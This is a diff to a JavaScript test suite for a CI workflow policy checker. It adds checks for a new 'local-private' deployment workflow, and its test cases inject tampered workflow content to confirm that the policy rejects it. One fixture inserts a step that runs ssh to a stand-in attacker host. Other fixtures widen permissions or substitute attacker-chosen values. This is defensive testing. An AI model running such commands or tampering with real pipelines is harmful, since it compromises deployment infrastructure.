@@ -6,6 +6,7 @@ import {
   deploymentPrerequisiteMismatches,
   privilegedWorkflowMismatches,
   v1InstallOnlyWorkflowMismatches,
+  v1LocalPrivateWorkflowMismatches,
 } from "./privileged-workflow-policy.mjs";
 
 const fixtures = [
@@ -14,6 +15,7 @@ const fixtures = [
   [".github/workflows/enterprise-live-evidence.yml", "production-live-evidence", false],
   [".github/workflows/release-attestation.yml", "github-sigstore-release-evidence", true],
   [".github/workflows/v1-install-only.yml", "install-v1", true],
+  [".github/workflows/v1-local-private.yml", "activate-v1-local-private", true],
 ];
 
 for (const [pathname, jobName, forbidTagTrigger] of fixtures) {
@@ -37,10 +39,12 @@ assert.match(
 
 const deployment = fs.readFileSync(".github/workflows/enterprise-infra.yml", "utf8");
 const installOnly = fs.readFileSync(".github/workflows/v1-install-only.yml", "utf8");
+const localPrivate = fs.readFileSync(".github/workflows/v1-local-private.yml", "utf8");
 const infraOps = fs.readFileSync("scripts/infra-ops.mjs", "utf8");
 assert.deepEqual(deploymentPrerequisiteMismatches(deployment), []);
 assert.deepEqual(dastReceiptWiringMismatches(deployment), []);
 assert.deepEqual(v1InstallOnlyWorkflowMismatches(installOnly), []);
+assert.deepEqual(v1LocalPrivateWorkflowMismatches(localPrivate), []);
 assert.match(
   v1InstallOnlyWorkflowMismatches(installOnly.replace("github.ref_protected == true", "true")).join(" "),
   /protected-main/,
@@ -67,6 +71,41 @@ assert.match(
     "      - name: Hidden remote command\n        run: /usr/bin/ssh attacker.example.invalid id\n      - name: Materialize frozen V1 release without activation",
   )).join(" "),
   /frozen candidate-specific controller/,
+);
+assert.match(
+  v1LocalPrivateWorkflowMismatches(localPrivate.replace("github.ref_protected == true", "true")).join(" "),
+  /protected-main/,
+);
+assert.match(
+  v1LocalPrivateWorkflowMismatches(localPrivate.replace("      group: infra-production-deploy", "      group: attacker-selected")).join(" "),
+  /serialize/,
+);
+assert.match(
+  v1LocalPrivateWorkflowMismatches(localPrivate.replace("  contents: read", "  contents: write")).join(" "),
+  /permissions/,
+);
+assert.match(
+  v1LocalPrivateWorkflowMismatches(localPrivate.replace("sh ./scripts/deploy-v1-local-private.sh", "sh ./scripts/deploy-vps.sh")).join(" "),
+  /fixed activation sink|provider activation boundary/,
+);
+assert.match(
+  v1LocalPrivateWorkflowMismatches(`${localPrivate}\n          sh ./scripts/deploy-v1-local-private.sh > "$receipt"\n`).join(" "),
+  /exactly one fixed activation sink/,
+);
+assert.match(
+  v1LocalPrivateWorkflowMismatches(localPrivate.replace(
+    "      - name: Activate the fixed V1 LOCAL_PRIVATE control plane",
+    "      - name: Hidden provider path\n        run: platform-activation-broker activate\n      - name: Activate the fixed V1 LOCAL_PRIVATE control plane",
+  )).join(" "),
+  /provider activation boundary/,
+);
+assert.match(
+  v1LocalPrivateWorkflowMismatches(localPrivate.replace("if-no-files-found: error", "if-no-files-found: ignore")).join(" "),
+  /receipt artifact/,
+);
+assert.match(
+  v1LocalPrivateWorkflowMismatches(localPrivate.replace('--unitSha256 "$unit_sha256"', '--unitSha256 "attacker-selected"')).join(" "),
+  /revalidate the exact root receipt/,
 );
 assert.match(deploymentPrerequisiteMismatches(deployment.replace("      - dast-zap\n", "")).join(" "), /exact .* prerequisite set/);
 assert.match(
@@ -195,6 +234,9 @@ const expectedBrownfieldOfflineStep = [
   "            scripts/v1-brownfield-scheduler-cutover.test.mjs \\",
   "            scripts/v1-brownfield-control-plane-policy.test.mjs \\",
   "            scripts/v1-brownfield-control-plane-gate.test.mjs \\",
+  "            scripts/v1-local-private-control.test.mjs \\",
+  "            scripts/v1-local-private-control.e2e.test.mjs \\",
+  "            scripts/deploy-v1-local-private.test.mjs \\",
   "            scripts/hosted-workload-preservation-guard.test.mjs",
 ].join("\n");
 const brownfieldOfflineStep = deployment.match(
@@ -212,6 +254,9 @@ assert.equal(
 );
 for (const command of [
   "scripts/v1-brownfield-application-data-cutover.test.mjs",
+  "scripts/v1-local-private-control.test.mjs",
+  "scripts/v1-local-private-control.e2e.test.mjs",
+  "scripts/deploy-v1-local-private.test.mjs",
 ]) {
   assert.equal(
     deployment.split(command).length - 1,
@@ -303,5 +348,5 @@ assert.match(
   "Control Center hygiene must include package-owned tests, state, and status suites",
 );
 
-const total = fixtures.length * 3 + 1 + 44;
+const total = fixtures.length * 3 + 1 + 56;
 process.stdout.write(`privileged workflow policy tests passed ${total}/${total}\n`);
